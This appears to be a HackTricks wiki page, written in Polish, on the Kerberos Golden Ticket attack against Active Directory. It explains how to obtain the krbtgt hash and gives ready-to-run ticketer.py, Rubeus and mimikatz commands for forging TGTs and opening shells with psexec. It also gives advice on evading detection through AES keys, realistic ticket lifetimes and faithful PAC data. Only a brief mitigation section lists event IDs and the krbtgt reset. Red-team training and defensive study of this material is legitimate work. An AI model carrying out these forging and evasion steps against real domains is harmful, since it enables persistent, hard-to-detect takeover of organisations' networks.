# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

Atak **Golden Ticket** polega na **utworzeniu legalnego Ticket Granting Ticket (TGT) podszywającego się pod dowolnego użytkownika** przy użyciu **hasha NTLM konta krbtgt w Active Directory (AD)**. Ta technika jest szczególnie korzystna, ponieważ **umożliwia dostęp do dowolnej usługi lub maszyny** w domenie jako podszywany użytkownik. Kluczowe jest pamiętanie, że **dane uwierzytelniające konta krbtgt nigdy nie są automatycznie aktualizowane**.

Aby **pozyskać hash NTLM** konta krbtgt, można zastosować różne metody. Można go wyciągnąć z procesu **Local Security Authority Subsystem Service (LSASS)** lub z pliku **NT Directory Services (NTDS.dit)** znajdującego się na dowolnym Domain Controller (DC) w domenie. Dodatkowo, **przeprowadzenie ataku DCsync** to kolejna strategia uzyskania tego hasha NTLM, którą można wykonać przy użyciu narzędzi takich jak moduł **lsadump::dcsync** w Mimikatz lub skrypt **secretsdump.py** z Impacket. Ważne jest podkreślenie, że do przeprowadzenia tych operacji **zwykle wymagane są uprawnienia domain admin lub podobny poziom dostępu**.

Chociaż hash NTLM jest do tego celu skuteczną metodą, **zdecydowanie zaleca się** **fałszowanie ticketów przy użyciu kluczy Kerberos Advanced Encryption Standard (AES) (AES128 i AES256)** ze względów bezpieczeństwa operacyjnego. Jest to jeszcze ważniejsze w nowoczesnych domenach, ponieważ **użycie RC4 jest stopniowo wycofywane** i znacznie wyraźniej wyróżnia się w telemetrii Kerberos.
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

# Example
.\Rubeus.exe golden /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /user:stegosaurus /ptt /ldap /nowrap

#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
### Uwagi dotyczące nowoczesnego tworzenia ticketów

Gdy to możliwe, **najpierw zapytaj LDAP i SYSVOL** , a następnie forge ticket używając rzeczywistych wartości polityki domeny i PAC użytkownika zamiast wymyślać je ręcznie:
```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:<username> /ldap /printcmd /nowrap
```
- `/ldap` pyta DC o dane użytkownika, grupy, NetBIOS i polityki używane do zbudowania bardziej realistycznego PAC.
- `/printcmd` wypisuje offline command line zawierający pobrane pola PAC, co jest przydatne, jeśli później chcesz sfałszować ten sam ticket bez ponownego dotykania LDAP.
- `/extendedupndns` dodaje nowsze elementy PAC `UpnDns` zawierające `samAccountName` i SID konta.
- `/oldpac` usuwa nowsze bufory PAC `Requestor` i `Attributes`; jest to głównie przydatne do testów kompatybilności ze starszymi środowiskami, a nie jako domyślne tradecraft.

Z Linuxa nowsze wersje Impacket także wspierają dodawanie nowszych struktur PAC i ustawianie realistycznego okresu ważności:
```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-user-id 500 -groups 512,513,518,519 -duration 10 \
-extra-pac administrator
```
- `-duration` jest w **godzinach**. Domyślnie to **10 years**, co jest głośne.
- `-extra-pac` dodaje nowsze informacje PAC `UPN_DNS`.
- `-old-pac` wymusza starszy układ PAC.
- `-extra-sid` jest przydatne, gdy PAC potrzebuje dodatkowych SID-ów (na przykład w scenariuszach eskalacji child-to-parent, które są opisane w [SID-History Injection](sid-history-injection.md)).

**Gdy już** masz wstrzyknięty **golden Ticket**, możesz uzyskać dostęp do współdzielonych plików **(C$)** oraz wykonywać usługi i WMI, więc możesz użyć **psexec** lub **wmiexec**, aby uzyskać shell (wygląda na to, że nie da się uzyskać shella przez winrm).

### Omijanie common detections

Najczęstszym sposobem wykrycia golden ticket jest **inspecting Kerberos traffic** w sieci. Domyślnie Mimikatz **podpisuje TGT na 10 years**, co będzie się wyróżniać jako anomalia w kolejnych żądaniach TGS wykonywanych z jego użyciem.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Użyj parametrów `/startoffset`, `/endin` i `/renewmax`, aby kontrolować offset startowy, duration oraz maksymalną liczbę odnowień (wszystko w minutach).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Niestety, czas życia TGT nie jest logowany w 4769, więc nie znajdziesz tej informacji w logach zdarzeń Windows. Jednak to, co możesz skorelować, to **występowanie 4769 bez wcześniejszego 4768**. **Nie jest możliwe zażądanie TGS bez TGT**, a jeśli nie ma rekordu o wydaniu TGT, możemy wnioskować, że został on sfałszowany offline.

W **nowszych buildach Windows** identyfikatory zdarzeń **4768** i **4769** ujawniają też znacznie lepszą **telemetrię typu szyfrowania**. Sfałszowany TGT/TGS używający **RC4 (`0x17`)** w domenie, w której `krbtgt`, klienci i usługi mają już klucze AES, jest dużo łatwiejszy do wykrycia niż kilka lat temu. To kolejny powód, aby preferować **Golden Tickets oparte na AES** i możliwie najdokładniej dopasowywać się do normalnej polityki Kerberos w domenie.

Innym problemem OPSEC jest **wierność PAC**. Bilety z niemożliwymi członkostwami w grupach, brakującymi nowszymi buforami PAC lub metadanymi konta, które nie zgadzają się z LDAP, są łatwiejsze do wykrycia, gdy obrońcy weryfikują zawartość PAC względem danych AD. Jeśli potrzebujesz TGT, który wygląda tak, jakby został naprawdę wydany przez DC, sprawdź:

{{#ref}}
diamond-ticket.md
{{#endref}}

Istnieją też **ograniczenia środowiskowe** dotyczące trwałości. Konto `krbtgt` ma **historię haseł równą 2**, więc sfałszowany TGT może pozostać ważny po **pierwszym** resecie `krbtgt`, jeśli został podpisany poprzednim kluczem. Dlatego obrońcy unieważniają Golden Tickets poprzez **dwukrotny reset `krbtgt`** i odczekanie co najmniej maksymalnego czasu życia biletu w domenie między resetami.

Aby **obejść to wykrywanie**, sprawdź diamond tickets.

### Mitigacja

- 4624: Account Logon
- 4672: Admin Logon
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Inne drobne sztuczki, które mogą zastosować obrońcy, to **alertowanie na 4769 dla wrażliwych użytkowników** takich jak domyślne konto administratora domeny oraz alertowanie na **użycie RC4 dla `krbtgt`** w domenach, które normalnie wydają bilety AES.

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password)
- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../banners/hacktricks-training.md}}
